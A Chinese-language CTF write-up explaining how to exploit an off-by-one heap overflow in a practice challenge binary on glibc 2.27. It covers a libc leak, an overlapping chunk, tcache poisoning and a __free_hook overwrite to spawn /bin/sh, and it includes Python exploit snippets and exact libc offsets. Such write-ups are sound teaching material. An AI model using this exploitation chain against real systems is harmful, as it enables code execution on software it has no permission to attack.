# pwn「one」— 1 字节堆溢出打 `__free_hook`（Ubuntu 18.04 / libc 2.27）

> NSSCTF 练习靶机（新能源汽车命令管理器）· 分类：Pwn · 难度：★★★★☆

| 项目 | 内容 |
|---|---|
| 题目名 | `one`（题面：Nowdays more and more new energy vehicles are appearing on the road.） |
| 分类 | Pwn / 堆利用（off-by-one → tcache overlap → hook 劫持） |
| 附件 | 一个 64 位 ELF `pwn`（Ubuntu 18.04 / gcc 7.5 编译，题目**没给** libc）；靶机 `nc 1.14.76.59 21166` |
| 一句话 | `edit()` 比申请长度多读 1 字节，改掉邻居 chunk 的 size 做出重叠块，再把 `__free_hook` 写成 `system` |
| 结果 | 未完成：链走到最后一步 `free("/bin/sh")` 段错误；根因是 `system` 偏移取错（`0x4f440` → `0x4f420`），已对着真实 libc 核对，未在靶机上重跑 |

> 文件名沿用合集编号（`17-pwn-libc227栈溢出`）。**本题实际是堆上的 1 字节溢出（off-by-one），不是栈溢出**——正文按证据写，不迁就文件名。

**最终答案**

```
未获取（远端在最后一步 SIGSEGV，没有回显 flag；卡点见第六节）
```

## 一、题目长什么样（先建立直觉）

附件只有一个 ELF，没有源码、没有 libc、没有 Dockerfile。跑起来是一个「命令管理器」：先做一道机器人验证（`Let me know if u are not a rebot.` 然后出一道 `a+b=?` 的加法），答对才进菜单——四个功能键（create / delete / test / edit）加 `5.exit`，脚本靠 `recvuntil(b"5.exit\n")` 对齐菜单、靠 `recvuntil(b"Finish!\n")` 判断每步完成。最多 9 个槽位（下标 0~8），单个命令最大 0x430 字节。

`objdump` 里能直接读到 5 个函数：`main`、`cre4t`、`delet`、`test`、`edit`，符号都没剥。全局数组两个：`slist`（`int[9]`，记长度，0x202040）和 `clist`（`char *[9]`，记指针，0x2020a0）。保护方面 `readelf -d` 显示 Full RELRO + BIND_NOW，类型是 `DYN`（PIE），PLT 里有 `stack_chk_fail`（有栈保护）。Full RELRO 意味着 GOT 只读，直接改 GOT 这条路一开始就被堵死，只剩 libc 里的 hook / FSOP 方向。

题面那句「新能源汽车」和二进制里毫无关系，只是壳；真正的考点是 `edit` 那一行 `read`。

## 二、思路总览

先给结论：**这是「1 字节改 size → 重叠块 → tcache 投毒 → 写 `__free_hook`」的标准 2.27 打法**。五个阶段：

```text
① create(0x430) → delete → 再 create 只写 8 字节 → test() 把残留的 bk 打印出来
   ↓ 泄露 main_arena+0x60，用「页对齐」反查 libc 版本
② 用 off-by-one 把 0x70 的块 B 的 size 改成 0xe1
   ↓ free(B) 落进 tcache[0xe0]；按 0xd8 申请又把 B 拿回来 → 得到一个和 C 重叠的块
③ 通过重叠块改写「已 free 的 C」的 fd → 指向 __free_hook
   ↓ 两次 malloc：第一次拿 C，第二次拿 __free_hook
④ 往 __free_hook 写 system，把某个块内容改成 "/bin/sh"
   ↓
⑤ free("/bin/sh") → __free_hook("/bin/sh") → system("/bin/sh")
```

关键前提是 **目标容器跑的是 glibc 2.27**（Ubuntu 18.04）：`tcache` 没有 key 检查、没有 safe-linking，`__free_hook` 也还在（2.34 才删）。题目不给 libc，所以第①步同时承担「泄露」和「认版本」两个任务。

## 三、逐步复现

### 3.1 第一步：把程序读成 C 结构

作用：先确认「能写多少、写到哪、程序怎么校验」，再谈利用。

```c
/* cre4t：序号 0~8，size 0~0x430 且非 0，每次 malloc 一块并 read 正好 size 字节 */
printf("the index of command?"); scanf("%d", &idx);
if (idx < 0 || idx > 8 || clist[idx]) { puts("Sorry"); exit(1); }
printf("the size of command?");  scanf("%d", &size);
if (size <= 0 || size > 0x430) { puts("sorry"); exit(1); }
slist[idx] = size;  clist[idx] = malloc(size);
puts("the command?");  read(0, clist[idx], slist[idx]);
puts("Finish!");

/* delet：free + 立刻置空（所以没有 UAF） */
free(clist[idx]); clist[idx] = NULL; slist[idx] = 0;

/* test：puts(clist[idx]) —— 一个「读内存到 \0」的原语，泄露全靠它 */

/* edit：这里是全题唯一的 bug —— 读 size+1 字节 */
read(0, clist[idx], slist[idx] + 1);
```

怎么读这个输出：`create` 自己只读 size 字节，是安全的；`edit` 读 size+1，多出来的 1 字节落在下一块 chunk 的 `size` 字段最低字节上。因为 glibc 的 chunk 大小是 16 对齐的，最低字节被改写后我们能让 `0x71` 变成任意 `0x?1`，比如 `0xe1`。

要让这 1 字节正好打在 size 上，申请长度必须满足 `size ≡ 8 (mod 16)`：例如申请 `0xf8`，块大小是 `0x100`，用户区正好顶到下一块的 `size` 字段，多读的那 1 字节就落上去了。

### 3.2 第二步：unsorted bin 泄露 libc

`create` 之后 `delete`，一个 0x440 的块会进 unsorted bin，此时它的 `user[0:8]`（fd）和 `user[8:16]`（bk）都被写成 `main_arena + 0x60`。再按同样大小 `create` 回来、但**只写 8 字节**，fd 被 `"B" * 8` 盖掉、bk 还在原地，接着用 `test()` 把这块当字符串 `puts` 出去——`B` 后面那 6 字节就是 bk 的低 6 字节：

```python
create(t, 0, 0x430, b"A" * 8)   # D：0x440 块
create(t, 1, 0x68,  b"G")       # G：0x70 守卫块，挡住和 top 合并
delete(t, 0)                    # D 进 unsorted bin，fd = bk = main_arena+0x60
create(t, 0, 0x430, b"B" * 8)   # 复用 D，user[8:16] 的 bk 残留
raw  = test(t, 0, 15)           # puts：8 个 B + 6 字节 bk + '\n'
leak = u64(raw[8:14])
```

实测泄露（当时那一次靶机的值，来自会话记录）：

```
leak = 0x7f6e66847ca0     # 远端 puts 出来的 main_arena+0x60
base = 0x7f6e6645c000     # leak - 0x3ebca0，低 12 位为 0 → 对齐
```

怎么读这个输出：`0x7f6e66847ca0 - 0x3ebca0 = 0x7f6e6645c000`，页对齐（低 12 位是 0），说明「main_arena+0x60 = 0x3ebca0」这个假设成立，远端确实是 2.27。脚本里没有硬写死版本，而是拿泄露值去减一张候选表（2.27 `0x3ebca0`、2.31 `0x1ebbe0`、2.23 `0x3c4b78`、2.35 `0x219ce0`），**谁能减出页对齐的基址就认谁**——这是没有 libc 附件时最实用的认版本办法。

### 3.3 第三步：1 字节把 B 撑成 0xe1，做重叠块

```python
# 预先在 C 的用户数据里伪造「B 变大之后的下一个块」的 size
p = bytearray(b"C" * 0x108)
p[0x60:0x68] = p64(0x21)   # B+0xe0 处（落在 C 的用户区里）的 size
p[0x80:0x88] = p64(0x21)   # 再下一块的 inuse 位

create(t, 2, 0xF8,  b"A" * 0xF8)   # A：0x100 块，末尾紧贴 B 的 size
create(t, 3, 0x68,  b"B" * 0x68)   # B：0x70 块，size=0x71
create(t, 4, 0x108, bytes(p))      # C：0x110 块
create(t, 6, 0x108, b"P")          # P2：另一块 0x110，后面要让 tcache 计数到 2

edit(t, 2, b"A" * 0xF8 + b"\xe1")  # 唯一的那 1 字节：B.size 0x71 → 0xe1
delete(t, 3)                       # free(B)：以 0xe0 的块进 tcache[0xe0]
create(t, 5, 0xD8, b"D" * 0x60)    # 申请 0xd8 → 拿回同地址的 B，但这次覆盖到 C
```

为什么要先伪造 `0x21`：2.27 的 `free` 在把块塞进 tcache 之前仍会读「下一个块」的 size 做基本校验，我们把 B 说成 0xe0 之后，`B+0xe0` 正好落在 C 的用户数据里，那里必须看起来像一个正常的 0x20 块。

`create(5, 0xD8)` 拿回的块起点还是 B，但因为 size 被撑到 0xe0，它的用户区覆盖了 C 的 `prev_size`/`size`/`user[0:8]`。到这里我们同时握着一个「活着的」指针（下标 5）和一个「已 free 的」C（下标 4），这就是重叠。

再看第一阶段那块 0x70 的守卫块 G（下标 1）：如果没有它，`delete(0)` 把 0x440 的块放出来时，它和 top 相邻会直接被合并进 top，fd/bk 根本不会写成 `main_arena+0x60`，泄露就无从谈起。所以「大块 + 守卫块」是泄露的固定搭配，不是随手多申请一块。

### 3.4 第四步：改写 tcache[0x110] 的 fd，拿到 `__free_hook`

```python
delete(t, 6)                                   # P2 → tcache[0x110]，count=1
delete(t, 4)                                   # C  → tcache[0x110]，count=2，C->fd = P2
# 用重叠块把 C 的头部修好，并把 fd 改成 __free_hook
edit(t, 5, b"E" * 0x60 + p64(0) + p64(0x111) + p64(free_hook) + p64(0))
create(t, 6, 0x108, b"F")                      # 拿回 C；tcache 头指针 := __free_hook
create(t, 7, 0x108, p64(system))               # 拿到 __free_hook，写入 system
```

偏移是这么算的：下标 5 的用户指针是 `B+0x10`，C 的 `prev_size` 在 `B+0x70`，所以 `C` 相对这里的偏移是 `0x60`——`0x60` 处写 `prev_size=0`，`0x68` 处写 `size=0x111`，`0x70` 处正好是 C 的 `user[0]`，也就是 tcache 的 `fd`。

`create(6)` 时 `tcache_get` 会把 `entries[0x10] = C->fd = __free_hook`、`count` 从 2 降到 1；`create(7)` 再取一次就返回 `__free_hook` 本身，随后的 `read` 把 `system` 的地址写进去。这一步是「两次 malloc 换一次任意地址写」。

### 3.5 第五步：触发 —— 这里是失败点

```python
edit(t, 6, b"/bin/sh\x00")   # C 的内容改成字符串
delete(t, 6, wait=False)     # free(C) → __free_hook(C) → system("/bin/sh")
```

客户端日志一路打印到 `trigger free('/bin/sh')`，远端返回的是：

```
Segmentation fault
```

`__free_hook` 在 `free()` 最开头就被调用，参数就是 `free` 的入参，所以「写 `/bin/sh` 再 free」等价于 `system("/bin/sh")`。段错误说明调过去的东西不是 `system`——地址写错了，不是堆布局错了。诊断与真因放在第六节。

### 3.6 为什么不走别的收尾

- **打 GOT**：Full RELRO + BIND_NOW，`.got` 段在启动时就被改成只读，这条路一开始就不成立。
- **`__malloc_hook`**：同样能写，但它的调用点在 `malloc` 里，参数是 `size` 而不是字符串，还得再凑一次「把 `size` 当指针用」或者套 one_gadget，麻烦。
- **one_gadget**：2.27 的几个 gadget 对 `rsp`、寄存器都有额外约束，题目里又没有稳定的可控现场，代价比 `free("/bin/sh")` 高得多。
- **FSOP**：2.27 还没上 vtable 校验，但需要能控制 `_IO_list_all` 附近的一整块数据，我们只有一次「malloc 到任意地址写 8 字节」，不够铺。

结论：`__free_hook = system` + `free("/bin/sh")` 是这题最短的收尾。

## 四、关键知识点

| 概念 | 是什么 | 这题为什么用它 | 以后在哪还会遇到 |
|---|---|---|---|
| off-by-one（1 字节溢出） | `read(len+1)` 正好压到邻居 chunk 的 size 最低字节 | 全题唯一的写原语，够把 `0x71` 改成 `0xe1` | 所有「按长度读」的命令管理器题 |
| unsorted bin 泄露 | free 进 unsorted 的块，fd/bk 指向 `main_arena+0x60` | 一次 `puts` 就能换出 libc 基址 | 2.27/2.31 的堆题（2.32+ 有 safe-linking 也不影响这条） |
| tcache poisoning | 改写已 free 块的 fd，下一次 malloc 就返回任意地址 | 拿到「任意地址写」，才能碰 `__free_hook` | 2.26~2.31 的主力打法 |
| `__free_hook` | glibc 在 `free()` 开头调用它，入参就是被 free 的指针 | `free("/bin/sh")` 直接等于 `system("/bin/sh")` | 2.27~2.33（2.34 起移除） |
| Full RELRO + BIND_NOW | GOT 段被 mprotect 成只读 | GOT 劫持走不通，只能打 libc 里的 hook | 读 `readelf -d` 时先看这一项 |
| 6 字节部分泄露 + 页对齐反查 | `puts` 遇 `\0` 停，只能漏 6 字节 | 用「减出页对齐」反推 libc 版本 | 任何没给 libc 的远程堆题 |

## 五、踩坑与陷阱

- **登录验证的字符串处理**：题面出的是 `18+3=?`，一开始只 `rstrip(b"?")`，剩下 `18+3=` 去 `int()`，直接 `ValueError`。要连 `=` 一起吃掉（`rstrip(b"=?")`）。
- **`scanf` 与 `read` 抢同一个 fd**：`scanf("%d")` 走的是 stdio 缓冲，`read(0, ...)` 直接走内核。把 `size` 和 payload 一次性发过去，stdio 很可能把 payload 也吸进自己的 8 KB 缓冲，`read()` 就只拿到半截，全链路错位。exp 里在 `recvuntil(b"the command?")` 之后 `time.sleep(DELAY)` 再单独发 payload，就是为了避开这个竞态。
- **`setvbuf(stdin, NULL, _IOLBF, 0)` 会先 malloc 8 KB 缓冲区**：堆里最前面有个 0x2010 的大块，所有布局都要往后挪，别拿「第一块就是我的块」去算偏移。
- **泄露字节可能是 `0x0a`**：地址第 4 字节随机，1/256 概率被 `recvline` 当成换行截断。脚本靠「长度必须为 6」做校验，错了就重连。
- **`tcache` 在 2.27 里排在 fastbin 前面**：0xe0 已经大于 `max_fast`（0x80），正常应该先进 unsorted bin 再被分到 small bin，但 2.27 的 `_int_free` 先走 tcache，所以它直接进了 `tcache[0xe0]`；到了 2.29+ 加了 `key` 双 free 检查、2.32+ 加了 safe-linking，这条链就不是原样成立了。
- **别抄网上的 `system` 偏移**：2.27 有 `3ubuntu1` / `1.2` / `1.6` 等多个点版本，`system` 会在 `0x4f440` / `0x4f550` / `0x4f420` 之间跳。这题就死在这 0x20 上。

## 六、卡点与正解方向

**已确认的部分（有远端响应为证）**

1. 漏洞位置：`edit()` 的 `read(0, clist[idx], slist[idx] + 1)`，1 字节任意写。
2. libc 泄露成功：远端实测 `0x7f6e66847ca0`，减 `0x3ebca0` 得 `0x7f6e6645c000`，页对齐 → 容器是 glibc 2.27。
3. 重叠块成立：`0x71 → 0xe1`、`free` 进 `tcache[0xe0]`、`0xd8` 申请拿回同地址，后续每一步远端都回了 `Finish!`。
4. `__free_hook` 写入成功：`create(7)` 返回 `__free_hook` 并写入了 8 字节，远端仍正常回 `Finish!`。
5. 崩溃点精确定位在 `free(C)` 触发的 hook 调用，不在堆操作。

**卡在哪**

`system` 的偏移写成了 `0x4f440`（那是 `2.27-3ubuntu1` 基版的值，很多老 writeup 都写这个）。这个镜像是 **`2.27-3ubuntu1.6`**，`system = 0x4f420`。差 `0x20`，`__free_hook` 里存的就是一个错地址，一调就 SIGSEGV。

**判定依据（可复现）**

把 Ubuntu 的 `libc6_2.27-3ubuntu1.6_amd64.deb` 下载下来解包，直接读符号：

```text
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.6) stable release version 2.27
system        0x4f420
__free_hook   0x3ed8e8
puts          0x80970
"/bin/sh"     0x1b3d88
```

我又用 ELF 解析脚本独立复核过一遍（不是只看 `readelf` 一行），结论一致：`system = 0x4f420`。顺带也解释了泄露偏移：`__malloc_hook = 0x3ebc30`、`main_arena = 0x3ebc40`、unsorted 头 `= main_arena+0x60 = 0x3ebca0`，和实测泄露完全自洽。

**正解方向**

1. 把 `exp_one.py` 里 `LIBC_TABLE` 的 `0x4F440` 改成 `0x4F420`，直接重跑（脚本是纯标准库，Windows 上 `python exp_one.py` 就行，不需要 WSL）。
2. 更稳的做法：写 `__free_hook` 之后先用 `test(7, 7)` 把 `__free_hook` 的内容回读出来，和算出的 `system` 地址逐字节比一遍，再触发 `free`。这样「偏移错」和「堆错」永远不会混在一起。
3. 如果还崩，按 `0x4f440`（1.x 基版）、`0x4f550`（1.2/1.4）依次换候选；每个候选重连一次，崩了就换下一个。
4. 想一劳永逸：用泄漏基址做一次「任意读」，把 libc 里的 `"GNU C Library (Ubuntu GLIBC ...)"` 字符串读出来，版本号直接落地，再查偏移。

## 七、赛场 20 分钟行动清单

1. `readelf -d ./pwn | head` —— 先看 RELRO/`BIND_NOW`/`PIE`，决定能不能打 GOT。
2. `objdump -d ./pwn | grep '<'` —— 符号没剥的话，5 个函数 2 分钟读完，直接盯 `edit` 的 `read` 长度。
3. 找 `size ≡ 8 (mod 16)` 的申请长度，确认 1 字节能落到下一块 size 上。
4. 先做 unsorted 泄露（0x430 那一套），拿到基址立刻验页对齐，把 libc 版本钉死。
5. 再动 off-by-one 和 tcache 投毒，**每步都用 `test()` 回读验证**，不要等到最后一步才看结果。
6. 写 hook 前，先把 `system` 偏移在本地 libc 上用 `readelf -sW | grep` 核一遍。

> 40 分钟还停在「泄露拿不到」就跳题；本题真正的坑不在堆，而在最后那个常数。

## 八、附件与脚本

现场文件都在 `pwnwork/`（只读引用，未改动）：

| 文件 | 作用 |
|---|---|
| `pwnwork/exp_one.py` | 完整 exp，**纯标准库**（自带 socket 封装，没装 pwntools 也能跑）：`python exp_one.py [host] [port]` |
| `pwnwork/getlibc.py` | 下载 `libc6_2.27-3ubuntu1.6_amd64.deb` 并解出 `libc-2.27.so` / `ld-2.27.so`（手写 ar 解析 + tarfile） |
| `pwnwork/libs_2.27-3ubuntu1.6/` | 已解包的 libc（本篇所有偏移都出自这里） |
| `pwnwork/probe.sh` / `setup.sh` / `fetch_libc.sh` | 连通性探测、Kali 里装 pwntools、早期取 libc 的脚本 |

exp 里的 `LIBC_TABLE` 就是「泄露值 →（版本、`system`、`__free_hook`）」的查表；改一个数字即可复用到其它 2.27 靶机。

> 注：同一工作区的 `pwn_chal/` 属于**另一道题**（2026 浙江赛 pwn：附件带 `libc.so.6` 与 `ld-linux-x86-64.so.2`，实测 `GLIBC 2.35-0ubuntu3.15`，考点是栈上 `read` 循环 + `ret2libc`），不要和本篇的 libc 2.27 混用。本篇所有数值均为**当时那一次**靶机的实测值（一次性实例，重建后地址会变，但偏移只跟 libc 版本有关）。
